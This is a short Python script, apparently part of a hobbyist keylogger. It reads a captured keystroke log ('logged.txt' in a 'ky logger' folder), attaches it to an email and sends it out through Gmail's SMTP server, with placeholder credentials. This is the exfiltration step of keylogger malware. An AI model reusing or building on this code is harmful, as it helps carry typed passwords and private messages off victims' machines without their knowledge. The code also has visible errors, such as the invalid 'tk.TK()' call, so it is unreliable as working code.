import smtplib as sm
from email.message import EmailMessage
import tkinter as tk
from tkinter import messagebox

def mail_send():
    msg=EmailMessage()
    msg["from"]="mailid"
    msg["to"]="rec_mail"
    msg["subject"]="this is the sample program with attacment"
    msg.set_content("mail with attachment!!!")
    fp=open("F:\ky logger\logged.txt","rb")
    data=fp.read()
    msg.add_attachment(data,maintype="text",subtype="octet-stream",filename="log.txt")
    mail=sm.SMTP('smtp.gmail.com',587)
    mail.starttls()
    mail.login("mailid","passwd")
    # body="helooo"
    try:
        mail.sendmail("mailid","rec_mail",msg.as_string())
        print("msg sent")
        root=tk.TK()
        root.withdraw()
        messagebox.showinfo(title="Success", message="Operation completed successfully.")
    except:
        print("error occured")
        messagebox.showinfo(title="Failed", message="Operation Faled.")
    mail.quit()
    return


